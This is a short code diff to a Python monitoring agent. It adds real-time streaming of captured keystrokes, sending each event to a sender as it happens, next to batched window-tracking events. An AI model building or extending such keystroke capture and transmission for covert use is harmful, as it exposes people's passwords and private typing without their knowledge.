@@ -33,7 +33,11 @@ class MonitoringAgent:
         self.event_queue = EventQueue(self.sender.send_events)
         
         # Initialize monitors with event callback
-        self.keystroke_logger = KeystrokeLogger(self._on_event)
+        # Pass live keystroke callback for real-time streaming
+        self.keystroke_logger = KeystrokeLogger(
+            self._on_event,
+            live_keystroke_callback=self._on_live_keystroke
+        )
         self.window_tracker = WindowTracker(
             self._on_event, 
             keystroke_logger=self.keystroke_logger
@@ -58,8 +62,12 @@ class MonitoringAgent:
         ]
     
     def _on_event(self, event: dict):
-        """Callback for all monitors to submit events"""
+        """Callback for all monitors to submit events (batched)"""
         self.event_queue.add_event(event)
+    
+    def _on_live_keystroke(self, event: dict):
+        """Callback for real-time keystroke streaming"""
+        self.sender.send_live_keystroke(event)
     
     def start(self):
         """Start all monitoring modules"""
